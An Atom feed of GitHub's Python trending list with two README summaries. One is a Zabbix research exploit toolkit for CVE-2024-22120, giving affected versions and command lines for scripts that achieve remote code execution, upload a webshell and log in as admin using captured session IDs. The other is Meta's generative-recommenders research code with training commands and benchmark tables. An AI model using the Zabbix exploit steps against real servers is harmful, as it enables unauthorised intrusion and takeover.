<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-05-23T01:31:59Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>W01fh4cker/CVE-2024-22120-RCE</title>
    <updated>2024-05-23T01:31:59Z</updated>
    <id>tag:github.com,2024-05-23:/W01fh4cker/CVE-2024-22120-RCE</id>
    <link href="https://github.com/W01fh4cker/CVE-2024-22120-RCE" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Time Based SQL Injection in Zabbix Server Audit Log --&gt; RCE&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2024-22120 ToolKit&lt;/h1&gt; &#xA;&lt;h1&gt;Affected Version/s&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;6.0.0 - 6.0.27&#xA;6.4.0 - 6.4.12&#xA;7.0.0alpha1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Credit&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://x.com/mf0cuz&#34;&gt;https://x.com/mf0cuz&lt;/a&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://support.zabbix.com/browse/ZBX-24505&#34;&gt;https://support.zabbix.com/browse/ZBX-24505&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://packetstormsecurity.com/files/137454/Zabbix-3.0.3-Remote-Command-Execution.html&#34;&gt;https://packetstormsecurity.com/files/137454/Zabbix-3.0.3-Remote-Command-Execution.html&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h1&gt;Premise&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;a low-privilege user&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Have permission to execute scripts&lt;/p&gt; &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520113821013.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Usage&lt;/h1&gt; &#xA;&lt;h2&gt;CVE-2024-22120-RCE&lt;/h2&gt; &#xA;&lt;p&gt;Capture packets to obtain sessionid and hostid:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520113103613.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python -m pip install requests pwntools&#xA;&#xA;python CVE-2024-22120-RCE.py --ip 192.168.198.136 --sid f026d1c7a3c36537cfe78fed35c7456a --hostid 10084&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520112956658.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;CVE-2024-22120-Webshell(Unable to use in most cases)&lt;/h2&gt; &#xA;&lt;p&gt;if you already have a session ID of Administrator privileged user, try:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python CVE-2024-22120-Webshell.py --ip 192.168.198.136 --aid fe647173d7769d55a43f161a68b256e0 --hostid 10084 --file shell.php&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;else:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python CVE-2024-22120-Webshell.py --ip 192.168.198.136 --sid f026d1c7a3c36537cfe78fed35c7456a --hostid 10084 --shell shell.php&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;But almost most of them cannot be written to the webshell through echo, because the execution user is zabbix:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520160457471.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;CVE-2024-22120-LoginAsAdmin&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python CVE-2024-22120-LoginAsAdmin.py --ip 192.168.198.136 --sid decf4ef56988027d62ca1db2a00d8346 --hostid 10084&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520175955624.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;test:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520180010132.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;replace then refresh:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520180055161.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;login as admin!!!&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520180339314.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>facebookresearch/generative-recommenders</title>
    <updated>2024-05-23T01:31:59Z</updated>
    <id>tag:github.com,2024-05-23:/facebookresearch/generative-recommenders</id>
    <link href="https://github.com/facebookresearch/generative-recommenders" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Repository hosting code used to reproduce results in &#34;Actions Speak Louder than Words: Trillion-Parameter Sequential Transducers for Generative Recommendations&#34; (https://arxiv.org/abs/2402.17152, ICML&#39;24).&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Generative Recommenders&lt;/h1&gt; &#xA;&lt;p&gt;Repository hosting code for &lt;code&gt;Actions Speak Louder than Words: Trillion-Parameter Sequential Transducers for Generative Recommendations&lt;/code&gt; (&lt;a href=&#34;https://arxiv.org/abs/2402.17152&#34;&gt;https://arxiv.org/abs/2402.17152&lt;/a&gt;, to appear in ICML&#39;24).&lt;/p&gt; &#xA;&lt;p&gt;Currently only code for reproducing public experiments listed in the paper (Section 4.1.1) are included. We plan to release custom kernels for HSTU needed for throughput/performance benchmarks at a later point in time.&lt;/p&gt; &#xA;&lt;h2&gt;Getting started&lt;/h2&gt; &#xA;&lt;h3&gt;Public experiments&lt;/h3&gt; &#xA;&lt;p&gt;To reproduce the public experiments (traditional sequential recommender setting, Section 4.1.1) on MovieLens and Amazon Reviews in the paper, please follow these steps:&lt;/p&gt; &#xA;&lt;h4&gt;Install dependencies.&lt;/h4&gt; &#xA;&lt;p&gt;Install PyTorch based on official instructions. Then,&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;pip3 install gin-config absl-py scikit-learn scipy matplotlib numpy apex hypothesis pandas fbgemm_gpu iopath&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Download and preprocess data.&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;mkdir -p tmp/ &amp;amp;&amp;amp; python3 preprocess_public_data.py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Run model training.&lt;/h4&gt; &#xA;&lt;p&gt;A GPU with 24GB or more HBM should work for most datasets.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;CUDA_VISIBLE_DEVICES=0 python3 train.py --gin_config_file=configs/ml-1m/hstu-sampled-softmax-n128-large-final.gin --master_port=12345&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Other configurations are included in configs/ml-1m, configs/ml-20m, and configs/amzn-books to make reproducing these experiments easier.&lt;/p&gt; &#xA;&lt;h4&gt;Verify results.&lt;/h4&gt; &#xA;&lt;p&gt;By default we write experimental logs to exps/. We can launch tensorboard with something like the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;tensorboard --logdir ~/generative-recommenders/exps/ml-1m-l200/ --port 24001 --bind_all&#xA;tensorboard --logdir ~/generative-recommenders/exps/ml-20m-l200/ --port 24001 --bind_all&#xA;tensorboard --logdir ~/generative-recommenders/exps/amzn-books-l50/ --port 24001 --bind_all&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;With the provided configuration (.gin) files, you should be able to reproduce the following results (verified as of 04/15/2024):&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;MovieLens-1M (ML-1M)&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Method&lt;/th&gt; &#xA;   &lt;th&gt;HR@10&lt;/th&gt; &#xA;   &lt;th&gt;NDCG@10&lt;/th&gt; &#xA;   &lt;th&gt;HR@50&lt;/th&gt; &#xA;   &lt;th&gt;NDCG@50&lt;/th&gt; &#xA;   &lt;th&gt;HR@200&lt;/th&gt; &#xA;   &lt;th&gt;NDCG@200&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;SASRec&lt;/td&gt; &#xA;   &lt;td&gt;0.2853&lt;/td&gt; &#xA;   &lt;td&gt;0.1603&lt;/td&gt; &#xA;   &lt;td&gt;0.5474&lt;/td&gt; &#xA;   &lt;td&gt;0.2185&lt;/td&gt; &#xA;   &lt;td&gt;0.7528&lt;/td&gt; &#xA;   &lt;td&gt;0.2498&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;BERT4Rec&lt;/td&gt; &#xA;   &lt;td&gt;0.2843 (-0.4%)&lt;/td&gt; &#xA;   &lt;td&gt;0.1537 (-4.1%)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;GRU4Rec&lt;/td&gt; &#xA;   &lt;td&gt;0.2811 (-1.5%)&lt;/td&gt; &#xA;   &lt;td&gt;0.1648 (+2.8%)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;HSTU&lt;/td&gt; &#xA;   &lt;td&gt;0.3097 (+8.6%)&lt;/td&gt; &#xA;   &lt;td&gt;0.1720 (+7.3%)&lt;/td&gt; &#xA;   &lt;td&gt;0.5754 (+5.1%)&lt;/td&gt; &#xA;   &lt;td&gt;0.2307 (+5.6%)&lt;/td&gt; &#xA;   &lt;td&gt;0.7716 (+2.5%)&lt;/td&gt; &#xA;   &lt;td&gt;0.2606 (+4.3%)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;HSTU-large&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.3294 (+15.5%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.1893 (+18.1%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.5935 (+8.4%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.2481 (+13.5%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.7839 (+4.1%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.2771 (+10.9%)&lt;/strong&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;strong&gt;MovieLens-20M (ML-20M)&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Method&lt;/th&gt; &#xA;   &lt;th&gt;HR@10&lt;/th&gt; &#xA;   &lt;th&gt;NDCG@10&lt;/th&gt; &#xA;   &lt;th&gt;HR@50&lt;/th&gt; &#xA;   &lt;th&gt;NDCG@50&lt;/th&gt; &#xA;   &lt;th&gt;HR@200&lt;/th&gt; &#xA;   &lt;th&gt;NDCG@200&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;SASRec&lt;/td&gt; &#xA;   &lt;td&gt;0.2889&lt;/td&gt; &#xA;   &lt;td&gt;0.1621&lt;/td&gt; &#xA;   &lt;td&gt;0.5503&lt;/td&gt; &#xA;   &lt;td&gt;0.2199&lt;/td&gt; &#xA;   &lt;td&gt;0.7661&lt;/td&gt; &#xA;   &lt;td&gt;0.2527&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;BERT4Rec&lt;/td&gt; &#xA;   &lt;td&gt;0.2816 (-2.5%)&lt;/td&gt; &#xA;   &lt;td&gt;0.1703 (+5.1%)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;GRU4Rec&lt;/td&gt; &#xA;   &lt;td&gt;0.2813 (-2.6%)&lt;/td&gt; &#xA;   &lt;td&gt;0.1730 (+6.7%)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;HSTU&lt;/td&gt; &#xA;   &lt;td&gt;0.3273 (+13.3%)&lt;/td&gt; &#xA;   &lt;td&gt;0.1895 (+16.9%)&lt;/td&gt; &#xA;   &lt;td&gt;0.5889 (+7.0%)&lt;/td&gt; &#xA;   &lt;td&gt;0.2473 (+12.5%)&lt;/td&gt; &#xA;   &lt;td&gt;0.7952 (+3.8%)&lt;/td&gt; &#xA;   &lt;td&gt;0.2787 (+10.3%)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;HSTU-large&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.3556 (+23.1%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.2098 (+29.4%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.6143 (+11.6%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.2671 (+21.5%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.8074 (+5.4%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.2965 (+17.4%)&lt;/strong&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;strong&gt;Amazon Reviews (Books)&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Method&lt;/th&gt; &#xA;   &lt;th&gt;HR@10&lt;/th&gt; &#xA;   &lt;th&gt;NDCG@10&lt;/th&gt; &#xA;   &lt;th&gt;HR@50&lt;/th&gt; &#xA;   &lt;th&gt;NDCG@50&lt;/th&gt; &#xA;   &lt;th&gt;HR@200&lt;/th&gt; &#xA;   &lt;th&gt;NDCG@200&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;SASRec&lt;/td&gt; &#xA;   &lt;td&gt;0.0306&lt;/td&gt; &#xA;   &lt;td&gt;0.0164&lt;/td&gt; &#xA;   &lt;td&gt;0.0754&lt;/td&gt; &#xA;   &lt;td&gt;0.0260&lt;/td&gt; &#xA;   &lt;td&gt;0.1431&lt;/td&gt; &#xA;   &lt;td&gt;0.0362&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;HSTU&lt;/td&gt; &#xA;   &lt;td&gt;0.0416 (+36.4%)&lt;/td&gt; &#xA;   &lt;td&gt;0.0227 (+39.3%)&lt;/td&gt; &#xA;   &lt;td&gt;0.0957 (+27.1%)&lt;/td&gt; &#xA;   &lt;td&gt;0.0344 (+32.3%)&lt;/td&gt; &#xA;   &lt;td&gt;0.1735 (+21.3%)&lt;/td&gt; &#xA;   &lt;td&gt;0.0461 (+27.7%)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;HSTU-large&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.0478 (+56.7%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.0262 (+60.7%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.1082 (+43.7%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.0393 (+51.2%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.1908 (+33.4%)&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.0517 (+43.2%)&lt;/strong&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;for all three tables above, the &lt;code&gt;SASRec&lt;/code&gt; rows are based on &lt;a href=&#34;https://arxiv.org/abs/1808.09781&#34;&gt;Self-Attentive Sequential Recommendation&lt;/a&gt; but with the original binary cross entropy loss replaced with sampled softmax losses proposed in &lt;a href=&#34;https://arxiv.org/abs/2306.04039&#34;&gt;Revisiting Neural Retrieval on Accelerators&lt;/a&gt;. These rows are reproducible with &lt;code&gt;configs/*/sasrec-*-final.gin&lt;/code&gt;. The &lt;code&gt;BERT4Rec&lt;/code&gt; and &lt;code&gt;GRU4Rec&lt;/code&gt; rows are based on results reported by &lt;a href=&#34;https://arxiv.org/abs/2309.07602&#34;&gt;Turning Dross Into Gold Loss: is BERT4Rec really better than SASRec?&lt;/a&gt; - note that the comparison slightly favors these two, due to them using full negatives whereas the other rows used 128/512 sampled negatives. The &lt;code&gt;HSTU&lt;/code&gt; and &lt;code&gt;HSTU-large&lt;/code&gt; rows are based on &lt;a href=&#34;https://arxiv.org/abs/2402.17152&#34;&gt;Actions Speak Louder than Words: Trillion-Parameter Sequential Transducers for Generative Recommendations&lt;/a&gt;; in particular, HSTU rows utilize identical configurations as SASRec. &lt;code&gt;HSTU&lt;/code&gt; and &lt;code&gt;HSTU-large&lt;/code&gt; results can be reproduced with &lt;code&gt;configs/*/hstu-*-final.gin&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Efficiency experiments&lt;/h3&gt; &#xA;&lt;p&gt;To be added at a later point in time.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;This codebase is Apache 2.0 licensed, as found in the &lt;a href=&#34;https://raw.githubusercontent.com/facebookresearch/generative-recommenders/main/LICENSE&#34;&gt;LICENSE&lt;/a&gt; file.&lt;/p&gt; &#xA;&lt;h2&gt;Contributors&lt;/h2&gt; &#xA;&lt;p&gt;The overall project is made possible thanks to the joint work from many technical contributors (listed in alphabetical order):&lt;/p&gt; &#xA;&lt;p&gt;Adnan Akhundov, Bugra Akyildiz, Shabab Ayub, Alex Bao, Renqin Cai, Jennifer Cao, Xuan Cao, Guoqiang Jerry Chen, Lei Chen, Sean Chen, Xianjie Chen, Huihui Cheng, Weiwei Chu, Ted Cui, Shiyan Deng, Nimit Desai, Fei Ding, Shilin Ding, Francois Fagan, Lu Fang, Leon Gao, Zhaojie Gong, Fangda Gu, Liang Guo, Liz Guo, Jeevan Gyawali, Yuchen Hao, Daisy Shi He, Michael Jiayuan He, Samuel Hsia, Jie Hua, Yanzun Huang, Hongyi Jia, Rui Jian, Jian Jin, Rahul Kindi, Changkyu Kim, Yejin Lee, Fu Li, Hong Li, Shen Li, Rui Li, Wei Li, Zhijing Li, Lucy Liao, Xueting Liao, Emma Lin, Hao Lin, Jingzhou Liu, Xing Liu, Xingyu Liu, Kai Londenberg, Yinghai Lu, Liang Luo, Linjian Ma, Matt Ma, Yun Mao, Bert Maher, Ajit Mathews, Matthew Murphy, Satish Nadathur, Min Ni, Jongsoo Park, Jing Qian, Lijing Qin, Alex Singh, Timothy Shi, Yu Shi, Dennis van der Staay, Xiao Sun, Colin Taylor, Shin-Yeh Tsai, Rohan Varma, Omkar Vichare, Alyssa Wang, Pengchao Wang, Shengzhi Wang, Wenting Wang, Xiaolong Wang, Yueming Wang, Zhiyong Wang, Wei Wei, Bin Wen, Carole-Jean Wu, Yanhong Wu, Eric Xu, Bi Xue, Hong Yan, Zheng Yan, Chao Yang, Junjie Yang, Wen-Yun Yang, Zimeng Yang, Chunxing Yin, Daniel Yin, Yiling You, Jiaqi Zhai, Keke Zhai, Yanli Zhao, Zhuoran Zhao, Hui Zhang, Jingjing Zhang, Lu Zhang, Lujia Zhang, Na Zhang, Rui Zhang, Xiong Zhang, Ying Zhang, Zhiyun Zhang, Charles Zheng, Erheng Zhong, Xin Zhuang.&lt;/p&gt; &#xA;&lt;p&gt;For the initial paper describing the Generative Recommender problem formulation and the HSTU architecture, please refer to &lt;code&gt;Actions Speak Louder than Words: Trillion-Parameter Sequential Transducers for Generative Recommendations&lt;/code&gt; (&lt;a href=&#34;https://arxiv.org/abs/2402.17152&#34;&gt;https://arxiv.org/abs/2402.17152&lt;/a&gt;, ICML&#39;24). More documentations, including an extended technical report, will follow later.&lt;/p&gt;</summary>
  </entry>
</feed>